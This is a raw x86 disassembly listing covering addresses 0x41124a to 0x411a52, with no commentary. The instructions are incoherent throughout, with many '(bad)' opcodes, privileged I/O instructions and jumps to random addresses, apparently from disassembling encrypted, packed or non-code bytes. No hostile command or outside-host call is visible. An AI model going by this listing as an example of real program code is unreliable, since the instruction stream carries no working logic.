  41124a:	cdq    
  41124b:	sar    DWORD PTR [esi+eiz*2],cl
  41124e:	(bad)  
  41124f:	mov    esi,0xa941383b
  411254:	or     eax,0xfffffff0
  411257:	nop
  411258:	adc    DWORD PTR [eax+0xa],0x70
  41125c:	sbb    ah,dh
  41125e:	gs xchg ebp,eax
  411260:	frstor [edi-0x61]
  411263:	mov    ah,BYTE PTR [ebx]
  411265:	inc    DWORD PTR [esi]
  411267:	mov    edi,0x5e8a0acf
  41126c:	push   ds
  41126d:	ss jg  0x411223
  411270:	jns    0x41124d
  411272:	lahf   
  411273:	jo     0x411278
  411275:	bnd ret 
  411277:	jmp    0x41125c
  411279:	ret    
  41127a:	dec    eax
  41127b:	mov    bh,0xb3
  41127d:	clc    
  41127e:	nop
  41127f:	mov    ds:0x5a662014,eax
  411284:	out    0xbb,eax
  411286:	retf   0x65eb
  411289:	push   eax
  41128a:	test   eax,0xeefd1714
  411290:	mov    cl,0xcb
  411292:	in     al,0x24
  411294:	dec    ecx
  411295:	jo     0x411238
  411297:	inc    ebp
  411298:	cmp    DWORD PTR [edx],edx
  41129a:	mov    esp,0x33439430
  41129f:	scas   eax,DWORD PTR es:[edi]
  4112a0:	sub    al,BYTE PTR [eax-0x3e2252c2]
  4112a6:	push   es
  4112a7:	rol    DWORD PTR [esi+edi*1],1
  4112aa:	or     DWORD PTR [ebp-0x75677577],eax
  4112b0:	xchg   BYTE PTR [eax],ah
  4112b2:	aad    0x83
  4112b4:	add    dh,BYTE PTR [ebx]
  4112b6:	xchg   ebx,eax
  4112b7:	not    BYTE PTR [esi]
  4112b9:	(bad)  
  4112bb:	xchg   ebx,eax
  4112bc:	pop    ecx
  4112bd:	or     ch,BYTE PTR [edi]
  4112bf:	jmp    0x99d6a72f
  4112c4:	pop    ebp
  4112c5:	or     eax,0xbe513820
  4112ca:	pop    edi
  4112cb:	imul   ebp,DWORD PTR [edi],0x8
  4112ce:	push   ebx
  4112cf:	dec    ecx
  4112d0:	and    ebp,DWORD PTR cs:[edx+eiz*8-0x39]
  4112d5:	xor    eax,ecx
  4112d7:	mov    bl,0xa9
  4112d9:	adc    ch,BYTE PTR [edi]
  4112db:	lods   al,BYTE PTR ds:[esi]
  4112dc:	imul   ebx,DWORD PTR [esi+ebx*4],0x62
  4112e0:	not    DWORD PTR [edx+0x411ff8be]
  4112e6:	jg     0x4112f5
  4112e8:	imul   ecx,DWORD PTR [eax+0x32],0x31
  4112ec:	ins    DWORD PTR es:[edi],dx
  4112ed:	aad    0x7
  4112ef:	fwait
  4112f0:	loope  0x411283
  4112f2:	push   0xc1c0b99d
  4112f7:	inc    edx
  4112f8:	data16 out 0x8c,al
  4112fb:	adc    DWORD PTR [esi+0x3c],ecx
  4112fe:	mov    WORD PTR [eax+0x71027fb5],es
  411304:	jns    0x4112df
  411306:	push   ecx
  411307:	mov    ds:0xee7220d4,al
  41130c:	in     al,0xb0
  41130e:	ins    BYTE PTR es:[edi],dx
  41130f:	scas   eax,DWORD PTR es:[edi]
  411310:	cwde   
  411311:	pop    edi
  411312:	sub    ch,BYTE PTR [edi+0x0]
  411315:	iret   
  411316:	(bad)  
  411317:	or     BYTE PTR [edx+0x5b2a2c4a],bh
  41131d:	ret    
  41131e:	mov    bh,0x18
  411320:	loop   0x41135f
  411322:	push   ds
  411323:	pusha  
  411324:	adc    edx,DWORD PTR [eax]
  411326:	fcmove st,st(7)
  411328:	jmp    0xf9df:0x8f582243
  41132f:	inc    edi
  411330:	xchg   edx,eax
  411331:	or     ch,BYTE PTR [ecx*4+0x2d3ff7f8]
  411338:	add    BYTE PTR [esi-0x29],bh
  41133b:	dec    ebx
  41133c:	mov    ds:0xea508276,eax
  411341:	or     al,0x6e
  411343:	ins    DWORD PTR es:[edi],dx
  411344:	aaa    
  411345:	inc    esp
  411346:	sbb    DWORD PTR [eax+ebx*8+0x32],0x9469be32
  41134e:	jo     0x4113a0
  411350:	pop    edi
  411351:	inc    ebx
  411352:	ins    BYTE PTR es:[edi],dx
  411353:	imul   esi,DWORD PTR [ebx+0x750aa684],0x31
  41135a:	ss aaa 
  41135c:	icebp  
  41135d:	or     ch,BYTE PTR [ecx-0x12ca2323]
  411363:	pop    esi
  411364:	push   ebp
  411365:	mov    WORD PTR [eax],gs
  411367:	mov    ss,WORD PTR [esi+eax*2-0x74]
  41136b:	mov    bl,0x3b
  41136d:	pop    edx
  41136e:	jmp    0x1f22443
  411373:	sub    DWORD PTR [ebx],ecx
  411375:	imul   eax,DWORD PTR [edi-0x791bf701],0x7
  41137c:	mov    DWORD PTR [eax],eax
  41137e:	xor    esi,DWORD PTR [ecx+0x598d1dec]
  411384:	jne    0x4113b7
  411386:	pop    ebp
  411387:	jbe    0x41138e
  411389:	inc    ebp
  41138a:	sbb    al,0x33
  41138c:	pop    edi
  41138d:	fcom   QWORD PTR [ebx+0x20]
  411390:	(bad)  
  411392:	cmovns edi,edi
  411395:	mov    al,ds:0x9c888c63
  41139a:	mov    bh,cl
  41139c:	test   al,0x69
  41139e:	adc    DWORD PTR [ecx+0x48cfdc94],0x4a
  4113a5:	test   BYTE PTR ds:0x5ce768d6,dl
  4113ab:	js     0x411403
  4113ad:	pop    esp
  4113ae:	out    dx,al
  4113af:	add    ebp,DWORD PTR [edi]
  4113b1:	(bad)
  4113b4:	scas   al,BYTE PTR es:[edi]
  4113b5:	ret    
  4113b6:	out    dx,eax
  4113b7:	leave  
  4113b8:	es lahf 
  4113ba:	sub    al,0x6d
  4113bc:	adc    ecx,edx
  4113be:	jle    0x41140d
  4113c0:	push   es
  4113c1:	in     al,0xf
  4113c3:	jae    0x41139c
  4113c5:	inc    DWORD PTR [edx]
  4113c7:	mov    al,BYTE PTR [edx+0x1d]
  4113ca:	retf   0x38fd
  4113cd:	sub    eax,0x97bb014f
  4113d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113d3:	ins    DWORD PTR es:[edi],dx
  4113d4:	fadd   QWORD PTR [ebx+0x36]
  4113d7:	dec    eax
  4113d8:	or     BYTE PTR [edi+0x501383ae],dl
  4113de:	int    0x74
  4113e0:	mov    esp,0x383e3786
  4113e5:	xchg   esp,eax
  4113e6:	(bad)  
  4113e7:	clc    
  4113e8:	mov    cl,BYTE PTR [edx-0x25]
  4113eb:	icebp  
  4113ec:	or     ah,BYTE PTR [ecx+0x7aff5ed0]
  4113f2:	lahf   
  4113f3:	xor    ch,BYTE PTR [edx]
  4113f5:	aaa    
  4113f6:	push   eax
  4113f7:	pop    edx
  4113f8:	jp     0x411475
  4113fa:	dec    esi
  4113fb:	sub    eax,0xaec44084
  411400:	and    al,0x1f
  411402:	sbb    edi,DWORD PTR [esi+0x3d6be045]
  411408:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411409:	repz shl BYTE PTR [ebp+0x73095efd],0xcb
  411411:	jge    0x4113b0
  411413:	dec    eax
  411414:	lds    ebp,FWORD PTR [ebx]
  411416:	xor    eax,0xb64a2ea0
  41141b:	mov    al,ds:0x3b48a05a
  411420:	(bad)  
  411421:	leave  
  411422:	cmp    eax,0x1de58cda
  411427:	and    al,0x81
  411429:	jp     0x4113c1
  41142b:	mov    dh,0xf5
  41142d:	test   eax,0xc7afc10a
  411432:	ss inc edx
  411434:	xchg   BYTE PTR ds:0xcd7ead78,dh
  41143a:	inc    edi
  41143b:	fwait
  41143c:	sub    al,BYTE PTR [edi+0x6f6803f4]
  411442:	mov    al,0xdc
  411444:	js     0x4113f8
  411446:	xchg   esi,eax
  411447:	rol    BYTE PTR [edx+0x7],0x8
  41144b:	leave  
  41144c:	fcmovu st,st(6)
  41144e:	mov    bh,0x1c
  411450:	popf   
  411451:	jg     0x41144e
  411453:	or     bl,BYTE PTR [esi]
  411455:	pop    ss
  411456:	outs   dx,DWORD PTR ds:[esi]
  411457:	push   edi
  411458:	test   eax,0xc52ea189
  41145d:	push   eax
  41145e:	add    DWORD PTR ds:0xb8570f74,edi
  411464:	iret   
  411465:	dec    esi
  411466:	lods   al,BYTE PTR ds:[esi]
  411467:	jge    0x4113f7
  411469:	sbb    ebp,edi
  41146b:	dec    ebp
  41146c:	pop    es
  41146d:	ja     0x4113f3
  41146f:	pop    esi
  411470:	vpminsw ymm5,ymm7,YMMWORD PTR [ebp+0x25]
  411475:	push   esi
  411476:	or     al,ch
  411478:	hlt    
  411479:	pop    edi
  41147a:	nop
  41147b:	push   0x6a
  41147d:	dec    eax
  41147e:	jnp    0x4114ab
  411480:	(bad)  
  411481:	imul   BYTE PTR [eax-0x163faf2f]
  411487:	stos   DWORD PTR es:[edi],eax
  411488:	out    0x52,eax
  41148a:	cld    
  41148b:	and    ebp,esi
  41148d:	ror    BYTE PTR [ebp+0x39],1
  411490:	xchg   BYTE PTR [edx-0x73140c44],bl
  411496:	mov    eax,DWORD PTR [ecx-0x23ee7c74]
  41149c:	int    0x6a
  41149e:	mov    esi,0x55a89637
  4114a3:	rcl    al,cl
  4114a5:	mov    esi,0x35a8f1aa
  4114aa:	mov    eax,0x4a321683
  4114af:	pop    ecx
  4114b0:	mov    ds:0x5b1797c,al
  4114b5:	or     ebx,DWORD PTR [edi-0x2c3e84a1]
  4114bb:	xchg   sp,ax
  4114bd:	add    BYTE PTR [esi-0x77fef00a],ch
  4114c3:	dec    ebx
  4114c4:	and    edi,DWORD PTR [esi]
  4114c6:	jne    0x411498
  4114c8:	xor    edi,DWORD PTR [edi]
  4114ca:	dec    edi
  4114cb:	xchg   edi,eax
  4114cc:	sbb    BYTE PTR [edi-0x5080f90e],0x26
  4114d3:	gs js  0x411538
  4114d6:	stos   BYTE PTR es:[edi],al
  4114d7:	(bad)  
  4114d9:	add    eax,0x5b69c356
  4114de:	mov    ch,0x76
  4114e0:	pop    ss
  4114e1:	mov    ah,0x34
  4114e3:	scas   al,BYTE PTR es:[edi]
  4114e4:	shl    DWORD PTR [esp+ebp*8+0x4e],1
  4114e8:	scas   al,BYTE PTR es:[edi]
  4114e9:	(bad)  
  4114ea:	xchg   esp,eax
  4114eb:	mov    bl,ch
  4114ed:	test   al,0xd4
  4114ef:	mov    ebx,0x86218636
  4114f4:	dec    ebp
  4114f5:	jecxz  0x411518
  4114f7:	mov    bl,0xdb
  4114f9:	or     al,0xfd
  4114fb:	test   BYTE PTR [eax+ebp*1],dl
  4114fe:	rcl    DWORD PTR [eax+0x496f14bc],1
  411504:	fs jl  0x4114ff
  411507:	inc    edx
  411508:	dec    edx
  411509:	popa   
  41150a:	ret    
  41150b:	sub    ah,BYTE PTR [esi-0x47]
  41150e:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411510:	and    DWORD PTR [edi+edi*8],ebx
  411513:	pop    esi
  411514:	jne    0x411512
  411516:	xchg   edi,eax
  411517:	retf   
  411518:	dec    ebx
  411519:	and    eax,0x95b5eacc
  41151e:	jne    0x411593
  411520:	push   edx
  411521:	(bad)  
  411522:	sti    
  411523:	daa    
  411524:	shr    DWORD PTR [ebp-0x53412177],0x1a
  41152b:	retf   0xdffb
  41152e:	mov    bh,0x81
  411530:	int    0x6d
  411532:	push   ebx
  411533:	xchg   esi,eax
  411534:	fsubr  QWORD PTR [esi-0x10]
  411537:	sbb    al,0x8b
  411539:	dec    edi
  41153a:	aas    
  41153b:	ins    DWORD PTR es:[edi],dx
  41153c:	popa   
  41153d:	adc    bh,ch
  41153f:	ret    0xe34f
  411542:	cdq    
  411543:	mov    edi,0xb6959386
  411548:	sti    
  411549:	sar    BYTE PTR [edx-0x3db77b2d],1
  41154f:	div    BYTE PTR [edx-0x60714887]
  411555:	xchg   esp,eax
  411556:	pop    edx
  411557:	cmp    eax,0x62add997
  41155c:	and    DWORD PTR ds:[eax+0x570e825b],eax
  411563:	mov    ecx,0x76810bbd
  411568:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411569:	stos   BYTE PTR es:[edi],al
  41156a:	push   eax
  41156b:	xor    BYTE PTR [esp+eiz*2],dl
  41156e:	xchg   ebx,eax
  41156f:	mov    eax,0xf217d2ae
  411574:	mov    ebx,0xa3581ede
  411579:	fdiv   DWORD PTR [ebp+0x72]
  41157c:	fimul  DWORD PTR [eax+0x3b308bb7]
  411582:	js     0x41155d
  411584:	mov    eax,0x9c172e62
  411589:	jnp    0x4115cb
  41158b:	std    
  41158c:	(bad)  
  41158d:	sub    bh,BYTE PTR [eax+0x3c]
  411590:	pop    es
  411591:	in     al,dx
  411592:	iret   
  411593:	mov    edx,0xae147d71
  411598:	add    eax,0xb7220531
  41159d:	push   ss
  41159e:	stos   DWORD PTR es:[edi],eax
  41159f:	xor    esp,DWORD PTR [eax+0xea17b68]
  4115a5:	rcr    ah,0x7c
  4115a8:	loop   0x411547
  4115aa:	mov    ebx,0x8eb4cfb9
  4115af:	mov    BYTE PTR [ebx],0xd3
  4115b2:	cwde   
  4115b3:	shl    ah,cl
  4115b5:	jmp    0xe06bde15
  4115ba:	mov    ds:0xb723b69e,al
  4115bf:	jns    0x411564
  4115c1:	outs   dx,DWORD PTR ds:[esi]
  4115c2:	push   edi
  4115c3:	pop    eax
  4115c4:	out    dx,al
  4115c5:	sbb    BYTE PTR [esi],0x8c
  4115c8:	push   ss
  4115c9:	clc    
  4115ca:	mov    ebx,0x935b7b5b
  4115cf:	shl    esi,cl
  4115d1:	neg    BYTE PTR [esi+0x52]
  4115d4:	arpl   WORD PTR [eax],si
  4115d6:	pushf  
  4115d7:	adc    bh,bl
  4115d9:	stc    
  4115da:	repz hlt 
  4115dc:	xchg   ecx,eax
  4115dd:	ficomp WORD PTR ds:0xd0e63801
  4115e3:	pop    ebx
  4115e4:	dec    ebx
  4115e5:	mov    DWORD PTR [esi-0x18f07609],ebp
  4115eb:	lahf   
  4115ec:	leave  
  4115ed:	jno    0x411573
  4115ef:	cmp    eax,0xa50f200
  4115f4:	mov    esi,0x11b1d309
  4115f9:	jl     0x41165c
  4115fb:	lods   al,BYTE PTR ds:[esi]
  4115fc:	ret    0x1dcb
  4115ff:	xchg   esp,eax
  411600:	sar    DWORD PTR [edx],1
  411602:	loop   0x41163d
  411604:	or     eax,eax
  411606:	lea    edx,[ebx+0x4d]
  411609:	mov    dl,0x58
  41160b:	pusha  
  41160c:	xor    DWORD PTR [ecx+0xfe584e0],esi
  411612:	jnp    0xb2e30144
  411618:	lea    esi,[edi]
  41161a:	add    al,0x6d
  41161c:	mov    ah,ah
  41161e:	bound  ecx,QWORD PTR [eax+0x19f17603]
  411624:	test   eax,0x4947a9aa
  411629:	cmp    ecx,DWORD PTR [ebx+0x26]
  41162c:	fstp   QWORD PTR ds:0xa44d5f5e
  411632:	cmc    
  411633:	ret    0xbfc0
  411636:	addr16 (bad) 
  411638:	sub    DWORD PTR [eax+0x4aaf5d19],edx
  41163e:	cmp    BYTE PTR [eax+edi*1-0x51fa0e1b],bh
  411645:	ins    BYTE PTR es:[edi],dx
  411646:	xchg   edi,eax
  411647:	sbb    al,0xf3
  411649:	pusha  
  41164a:	or     dh,BYTE PTR [eax]
  41164c:	mov    ds:0x38f4679,al
  411651:	retf   
  411652:	loope  0x4116a8
  411654:	push   ss
  411655:	cdq    
  411656:	jo     0x411609
  411658:	(bad)  
  411659:	in     eax,dx
  41165a:	jg     0x41165c
  41165c:	pop    es
  41165d:	jns    0x4115ee
  41165f:	add    al,0xc
  411661:	stos   BYTE PTR es:[edi],al
  411662:	xchg   edx,eax
  411663:	int    0xa3
  411665:	cli    
  411666:	js     0x4115fe
  411668:	push   esp
  411669:	les    esi,FWORD PTR [ebp+0x739e8c85]
  41166f:	idiv   BYTE PTR [ecx+0x229f724a]
  411675:	and    al,0xcd
  411677:	cmp    BYTE PTR [ebx],dh
  411679:	cli    
  41167a:	dec    ebp
  41167b:	enter  0x7553,0x53
  41167f:	inc    ebx
  411680:	addr16 cmp ebx,0x480aae45
  411687:	inc    edx
  411688:	adc    ah,BYTE PTR [edi-0x7672de8a]
  41168e:	jns    0x41168f
  411690:	rcl    DWORD PTR [ebp+0x1196d5c6],1
  411696:	stos   DWORD PTR es:[edi],eax
  411697:	adc    BYTE PTR [ebp+0x33],dl
  41169a:	xchg   DWORD PTR [ebp+0x12662f65],esp
  4116a0:	mov    dh,0x2
  4116a2:	mov    eax,0xdaeaf4b3
  4116a7:	shl    ah,0xbb
  4116aa:	retf   0x6294
  4116ad:	retf   
  4116ae:	pop    DWORD PTR [edi-0x7f95b955]
  4116b4:	mov    esp,db0
  4116b7:	les    edi,FWORD PTR [eax]
  4116b9:	or     BYTE PTR [edi+0x3b],0xc1
  4116bd:	adc    ah,BYTE PTR [eax-0x5b0c3471]
  4116c3:	dec    eax
  4116c4:	inc    ebp
  4116c5:	arpl   di,bp
  4116c7:	mov    ebx,0xb643d52e
  4116cc:	aam    0x26
  4116ce:	sbb    DWORD PTR [esp+ecx*4+0x4471784f],ecx
  4116d5:	push   edx
  4116d6:	arpl   WORD PTR [ebp+0x1be7f97b],sp
  4116dc:	inc    eax
  4116dd:	cdq    
  4116de:	xor    DWORD PTR [eax+esi*8],esp
  4116e1:	fsubr  DWORD PTR [ecx+0x73]
  4116e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116e5:	xchg   ebp,eax
  4116e6:	inc    eax
  4116e7:	popf   
  4116e8:	popa   
  4116e9:	dec    edx
  4116ea:	retf   0x99e6
  4116ed:	fld    QWORD PTR [ecx-0x6794df23]
  4116f3:	cmp    ebp,DWORD PTR [ebp-0x37c75a62]
  4116f9:	stc    
  4116fa:	sbb    ah,BYTE PTR [eax+0x231a4f8]
  411700:	repnz sar DWORD PTR [ebx],0x43
  411704:	out    dx,eax
  411705:	adc    dl,BYTE PTR [esi+0x18]
  411708:	cld    
  411709:	push   es
  41170a:	cs dec esp
  41170c:	cld    
  41170d:	xchg   ebp,eax
  41170e:	ja     0x4116c8
  411710:	imul   edx,edi,0xffffff8b
  411713:	sbb    ebp,DWORD PTR [edx+ecx*2+0x574ec7f3]
  41171a:	imul   edx,ecx,0xcc7db123
  411720:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411721:	dec    ebp
  411722:	pop    edx
  411723:	xchg   edx,eax
  411724:	jp     0x41177d
  411726:	xor    DWORD PTR [eax-0x6a536bb0],ecx
  41172c:	mov    WORD PTR [eax+0x25e75d14],?
  411732:	gs or  al,0x45
  411735:	inc    ebp
  411736:	adc    ecx,eax
  411738:	cmp    eax,0xda286fab
  41173d:	loop   0x411771
  41173f:	mov    bh,0xf5
  411741:	loop   0x411774
  411743:	mov    al,ds:0x75f0aaa9
  411748:	mov    al,ds:0x3fec57a3
  41174d:	sbb    BYTE PTR [esi+0x3d],ch
  411750:	cli    
  411751:	push   ebp
  411752:	imul   eax,DWORD PTR [edi],0x64
  411755:	xchg   ecx,eax
  411756:	mov    bh,0xe4
  411758:	sti    
  411759:	jg     0x41170d
  41175b:	jmp    0xcfabef91
  411760:	mov    ebx,0x1c35f667
  411765:	or     BYTE PTR [edx+0x378f107f],dl
  41176b:	jb     0x411705
  41176d:	popf   
  41176e:	push   0xad5b0f69
  411773:	ret    
  411774:	add    al,0xcc
  411776:	arpl   WORD PTR [ecx+0xc],sp
  411779:	scas   eax,DWORD PTR es:[edi]
  41177a:	cmp    edx,DWORD PTR [eax-0x13d981a7]
  411780:	sbb    al,0xa2
  411782:	hlt    
  411783:	arpl   WORD PTR [edi+0x12],bx
  411786:	aam    0xdd
  411788:	ret    0x16a4
  41178b:	imul   BYTE PTR [esi-0x2e]
  41178e:	fst    DWORD PTR [ecx+0x0]
  411791:	cwde   
  411792:	mov    dh,0xa6
  411794:	or     dl,ch
  411796:	(bad)  
  411797:	clc    
  411798:	sub    edx,0xffffffaa
  41179b:	into   
  41179c:	inc    ebx
  41179d:	inc    ebp
  41179e:	adc    cl,BYTE PTR [ebx+edx*1+0x2b]
  4117a2:	lods   eax,DWORD PTR ds:[esi]
  4117a3:	and    BYTE PTR [esi+0x5a9abbc5],ch
  4117a9:	into   
  4117aa:	and    al,0x6
  4117ac:	push   0xcc556f58
  4117b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117b2:	repz ja 0x41180a
  4117b5:	les    ecx,FWORD PTR [eax]
  4117b7:	fidivr WORD PTR [edi-0xa11a349]
  4117bd:	les    edi,FWORD PTR [edi+0xa9e39c5]
  4117c3:	enter  0x621b,0xa1
  4117c7:	lods   eax,DWORD PTR ds:[esi]
  4117c8:	mov    esi,ds
  4117ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117cb:	nop
  4117cc:	lahf   
  4117cd:	mov    ebx,ebp
  4117cf:	dec    esp
  4117d0:	jmp    0x41180b
  4117d2:	test   al,0xe2
  4117d4:	inc    ecx
  4117d5:	int3   
  4117d6:	adc    BYTE PTR [esi+0x79],al
  4117d9:	pop    es
  4117da:	pop    ss
  4117db:	dec    esi
  4117dc:	call   0x44527fd2
  4117e1:	pusha  
  4117e2:	sub    al,0x77
  4117e4:	mov    eax,ds:0x5cfd8eed
  4117e9:	hlt    
  4117ea:	jp     0x411817
  4117ec:	push   es
  4117ed:	pop    edi
  4117ee:	inc    ecx
  4117ef:	adc    ecx,DWORD PTR ds:0xd5361adb
  4117f5:	and    al,BYTE PTR [edx+0x1cd68046]
  4117fb:	xor    eax,0xe3b15c12
  411800:	lahf   
  411801:	and    al,BYTE PTR [ecx+0x40]
  411804:	push   ebx
  411805:	cmp    al,0x43
  411807:	into   
  411808:	mov    ecx,0x8bdd826a
  41180d:	(bad)  
  41180e:	popf   
  41180f:	pop    ebx
  411810:	xchg   dh,ah
  411812:	cs int 0x81
  411815:	ret    
  411816:	adc    BYTE PTR [esi],dl
  411818:	icebp  
  411819:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41181a:	ret    0xe6f0
  41181d:	pop    esp
  41181e:	pushf  
  41181f:	scas   al,BYTE PTR es:[edi]
  411820:	outs   dx,DWORD PTR ds:[esi]
  411822:	jl     0x4117fa
  411824:	popf   
  411825:	xchg   DWORD PTR [eax-0x5e],eax
  411828:	adc    al,BYTE PTR ds:0x6283298c
  41182e:	fcomp  QWORD PTR [ebp+0x7d]
  411831:	and    edx,edx
  411833:	test   ebx,0x8e040e8b
  411839:	xchg   DWORD PTR [ecx-0x3f70d9b8],esp
  41183f:	mov    ebx,0x8faff9e8
  411844:	pop    ebp
  411845:	inc    ecx
  411846:	xor    al,0xdf
  411848:	cdq    
  411849:	nop
  41184a:	sar    DWORD PTR [eax+0x67],0x64
  41184e:	mov    bl,0x29
  411850:	push   si
  411852:	cmp    DWORD PTR [eax+0x17],edx
  411855:	jae    0x4117dc
  411857:	fdivp  st(6),st
  411859:	mov    esi,0x4bce6c54
  41185e:	loopne 0x4117e3
  411860:	push   cs
  411861:	dec    ebp
  411862:	push   ds
  411863:	pop    edx
  411864:	test   eax,0xf91e2485
  411869:	imul   DWORD PTR [ecx+0x20da094b]
  41186f:	jmp    0xbc84:0x3b87a8ae
  411876:	(bad)  
  411877:	sub    edi,DWORD PTR [ebx+ebp*4+0x69ebc517]
  41187e:	lea    eax,[edi+0x5f01e6b1]
  411884:	push   ebp
  411885:	mov    ebx,0xa27a2f1a
  41188a:	adc    ebx,edi
  41188c:	mov    edx,DWORD PTR [esi+eiz*2]
  41188f:	into   
  411890:	int    0x62
  411892:	ss call 0xdf0130f
  411898:	daa    
  411899:	aas    
  41189a:	neg    DWORD PTR [ecx-0x28]
  41189d:	push   ds
  41189e:	loope  0x4118ca
  4118a0:	sbb    al,0x95
  4118a2:	mov    ecx,esp
  4118a4:	retf   
  4118a5:	out    0x6c,eax
  4118a7:	pusha  
  4118a8:	addr16 inc eax
  4118aa:	or     ecx,DWORD PTR [edx]
  4118ac:	idiv   edx
  4118ae:	inc    ebx
  4118af:	dec    esp
  4118b0:	jge    0x4118e1
  4118b2:	mov    esp,DWORD PTR [eax+0x34aeae32]
  4118b8:	fidiv  WORD PTR [ebp+0x16]
  4118bb:	and    ecx,0x529645b0
  4118c1:	pop    eax
  4118c2:	pushf  
  4118c3:	cli    
  4118c4:	pop    edx
  4118c5:	scas   eax,DWORD PTR es:[edi]
  4118c6:	pop    ebp
  4118c7:	test   al,0xf9
  4118c9:	fcomp  DWORD PTR ds:0xacb14352
  4118cf:	pop    edx
  4118d0:	jge    0x41189e
  4118d2:	ins    BYTE PTR es:[edi],dx
  4118d3:	inc    esi
  4118d4:	(bad)  
  4118d6:	sti    
  4118d7:	inc    ebx
  4118d8:	ds push ds
  4118da:	and    dh,dh
  4118dc:	cmp    eax,0x4fe5fec2
  4118e1:	xor    DWORD PTR [ecx-0x439d57de],edi
  4118e7:	or     edx,DWORD PTR [ebx]
  4118e9:	loop   0x411961
  4118eb:	fstp   QWORD PTR [eax+0x7e986a90]
  4118f1:	mov    ch,0xc5
  4118f3:	sub    al,BYTE PTR [ecx+0x6]
  4118f6:	push   edx
  4118f7:	rcr    BYTE PTR [ebp+0x116cf9e2],cl
  4118fd:	pop    ebx
  4118fe:	ret    
  4118ff:	lods   al,BYTE PTR ds:[esi]
  411900:	inc    ebp
  411901:	xchg   ebx,eax
  411902:	ss js  0x4118b5
  411905:	push   0xffffffad
  411907:	fs cmp bl,bh
  41190a:	out    0xca,eax
  41190c:	call   0x746e6a73
  411911:	cmovae ebp,esi
  411914:	and    dl,BYTE PTR [ecx+0x78]
  411917:	and    BYTE PTR [edx-0x34],ch
  41191a:	sbb    al,BYTE PTR [ebx+0x632b3c96]
  411920:	cmp    al,0x8d
  411922:	sar    DWORD PTR [ebx],0xdc
  411925:	jbe    0x4118e3
  411927:	je     0x411928
  411929:	mov    ebx,0x6d411cbc
  41192e:	mov    ebx,0x295e6733
  411933:	in     eax,0x24
  411935:	pop    edi
  411936:	or     bh,BYTE PTR [edx-0x64176674]
  41193c:	psraw  mm5,QWORD PTR [edx-0x21a0f5cb]
  411943:	shl    BYTE PTR [edi],1
  411945:	ret    0xb220
  411948:	jge    0x4119c9
  41194a:	xor    eax,0x9c4b332f
  41194f:	inc    edx
  411950:	and    ebx,0x77
  411953:	pop    es
  411954:	cdq    
  411955:	rol    DWORD PTR ds:0x3e2760c,0x5f
  41195c:	inc    edx
  41195d:	fist   WORD PTR [ebx+0x57]
  411960:	scas   eax,DWORD PTR es:[edi]
  411961:	inc    edi
  411962:	retf   0x2af2
  411965:	jle    0x4119d3
  411967:	mov    ah,0x74
  411969:	inc    ebp
  41196a:	adc    al,0xa3
  41196c:	xor    DWORD PTR ds:0xa008105,ecx
  411972:	ins    DWORD PTR es:[edi],dx
  411973:	nop
  411974:	fs sbb eax,0x423757ca
  41197a:	push   eax
  41197b:	shl    BYTE PTR [edx],cl
  41197d:	cli    
  41197e:	sbb    BYTE PTR [eax+eiz*2],bl
  411981:	shl    BYTE PTR [ebx-0xc],cl
  411984:	in     eax,0xcc
  411986:	(bad)  
  411987:	cli    
  411988:	or     al,0xdc
  41198a:	call   DWORD PTR [edi-0x3bc90606]
  411990:	sti    
  411991:	mov    ds:0xeed81af5,eax
  411996:	in     eax,dx
  411997:	sub    eax,0xb972c402
  41199c:	xchg   esi,eax
  41199d:	std    
  41199e:	cli    
  41199f:	outs   dx,DWORD PTR ds:[esi]
  4119a0:	sbb    ecx,0x54
  4119a3:	shr    DWORD PTR [esi],cl
  4119a5:	jle    0x411979
  4119a7:	dec    edx
  4119a8:	cmp    al,0x51
  4119aa:	loop   0x4119fc
  4119ac:	dec    ebx
  4119ad:	enter  0x935d,0xb3
  4119b1:	mov    ecx,0x2893f46b
  4119b6:	xor    BYTE PTR [esi-0x7],bl
  4119b9:	push   esi
  4119ba:	xchg   eax,edx
  4119bc:	nop
  4119bd:	pop    eax
  4119be:	add    al,0xef
  4119c0:	hlt    
  4119c1:	jge    0x411985
  4119c3:	dec    ecx
  4119c4:	pop    es
  4119c5:	enter  0x2408,0xe0
  4119c9:	xchg   esi,eax
  4119ca:	or     esp,ebp
  4119cc:	mov    eax,0x6f968608
  4119d1:	jns    0x411a32
  4119d3:	in     eax,0x7e
  4119d5:	cwde   
  4119d6:	repnz not al
  4119d9:	(bad)  
  4119da:	ds ins BYTE PTR es:[di],dx
  4119dd:	sbb    BYTE PTR [edi],al
  4119df:	jb     0x411a37
  4119e1:	pushf  
  4119e2:	sbb    eax,ecx
  4119e4:	mov    ebx,0x9f0509f6
  4119e9:	mov    esi,0x657ac191
  4119ee:	mov    dl,0x9a
  4119f0:	js     0x4119ee
  4119f2:	mov    ebx,0x32752cb9
  4119f7:	and    ebp,DWORD PTR [edx-0x37]
  4119fa:	adc    ebp,0x15
  4119fd:	arpl   WORD PTR [edi-0x29a9600b],sp
  411a03:	mov    ds:0x9589044c,eax
  411a08:	dec    eax
  411a09:	or     al,0xb0
  411a0b:	or     edx,DWORD PTR [eax-0xa21e34f]
  411a11:	je     0x4119fc
  411a13:	or     ch,BYTE PTR [edi-0x35]
  411a16:	dec    esi
  411a17:	push   0xd0deb87a
  411a1c:	xor    ecx,ecx
  411a1e:	mov    edi,0x3ab3b10c
  411a23:	inc    eax
  411a24:	retf   0xa223
  411a27:	jne    0x4119c4
  411a29:	mov    esp,DWORD PTR [edx-0x7d399f93]
  411a2f:	inc    esp
  411a30:	pop    ss
  411a31:	pusha  
  411a32:	jns    0x4119b7
  411a34:	mov    fs,WORD PTR [esi-0xa]
  411a37:	cmp    DWORD PTR ds:0x21a1fd70,ebx
  411a3d:	sub    al,0xb5
  411a3f:	cmp    bh,dh
  411a41:	adc    al,0x93
  411a43:	push   ecx
  411a44:	rcr    DWORD PTR [esi-0x71],0xe1
  411a48:	mov    dh,0xad
  411a4a:	and    al,0x17
  411a4c:	or     eax,0x683895c8
  411a51:	into   
  411a52:	sti    
